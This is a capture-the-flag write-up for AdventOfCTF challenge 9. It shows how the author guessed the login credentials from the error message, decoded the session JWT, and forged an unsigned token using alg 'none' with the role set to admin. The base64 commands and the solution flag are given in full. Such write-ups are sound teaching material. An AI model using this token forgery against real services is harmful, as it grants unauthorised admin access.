+++
author = "Maik de Kruif"
title = "Challenge 9 - AdventOfCTF"
date = 2020-12-11T21:24:52+01:00
description = "A writeup for challenge 9 of AdventOfCTF."
cover = "img/adventofctf/2020/973ded4b2381c28af6c24d3d670303c6.png"
tags = [
    "AdventOfCTF",
    "challenge",
    "ctf",
    "hacking",
    "writeup",
    "web",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

- Points: 900

## Description

Can you find a way to get into the Naughty List Management System as an admin?

Visit <https://09.adventofctf.com> to start the challenge.

## Finding the vulnerability

Upon opening the website, we're greeted with a login screen. When we enter random credentials, we're greeted with some text: "Hey **user** your **password** is incorrect.".

This took me quite some time to find out, but it's actually fairly obvious. I started by taking a look at the cookies, but there were none. Then I tried some common URLs, but nothing (except `/admin`). Then I took another look at the error message; some bold text... The username is `user` and the password is `incorrect`.

When entering these credentials, we get redirected to `/admin` with a message: "The naughty list is currently empty....". This time, however, we also got a cookie.

```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoyODk2MSwidGV4dCI6IkkgZG8gbG92ZSBhIGdvb2QgcHV6emxlLiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3NzE3ODU3fQ.rre-8SBgllKlu7KpJFXuO-SEN3s-9IPRSJ7hmclXpNs
```

### JWT

This looks like a JWT. We can confirm this by decoding the text before the first period (`.`):

```bash
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
```

```json
{ "typ": "JWT", "alg": "HS256" }
```

It is a JWT that uses the HMAC-SHA256 (`HS256`) algorithm. Using a [JSON Web Token (JWT)](https://en.wikipedia.org/wiki/JSON_Web_Token) is a compact, URL-safe, way of representing claims between a web server and a client. Let's decode the second part as well.

```bash
echo -n "eyJhdXRoIjoyODk2MSwidGV4dCI6IkkgZG8gbG92ZSBhIGdvb2QgcHV6emxlLiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3NzE3ODU3fQ" | base64 -d
```

```json
{
  "auth": 28961,
  "text": "I do love a good puzzle.",
  "role": "user",
  "iat": 1607717857
}
```

We don't have to decode the last part as it is a secret that consists of non-printable characters.

The role in the JWT probably has to be changed to `"admin"` so let's try to do that.

#### Modifying a JWT

To modify a JWT, we would have to know the secret that was used to create it. If only there were some [vulnerabilities](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/) 😀.

In a JWT you can use `none` as the algorithm. It is intended to be used for situations where the integrity of the token has already been verified. Luckily for us, some libraries treat tokens signed with the `none` algorithm as a valid token with a verified signature. This means anyone can create their own "signed" tokens with whatever payload they want, allowing arbitrary account access on some systems.

To create such a JWT, we just reverse the process. Firstly, we create the first part of the token.

```bash
echo -n '{"typ":"JWT","alg":"none"}' | base64
> eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=
```

Then the middle part:

```bash
echo -n '{"auth":28961,"text":"I do love a good puzzle.","role":"admin","iat":1607717857}' | base64
> eyJhdXRoIjoyODk2MSwidGV4dCI6IkkgZG8gbG92ZSBhIGdvb2QgcHV6emxlLiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzcxNzg1N30=
```

And finally, the secret. We can leave this empty because we use the `none` algorithm.

Putting all of this together and removing the padding (`=`), we get `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoyODk2MSwidGV4dCI6IkkgZG8gbG92ZSBhIGdvb2QgcHV6emxlLiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzcxNzg1N30.`

## Solution

When setting the cookie to this value and reloading the page, we get the flag: `NOVI{Jw7_f@ilure_in_n0ne}`.

This flag can then be submitted for the [challenge](https://ctfd.adventofctf.com/challenges#9-10).
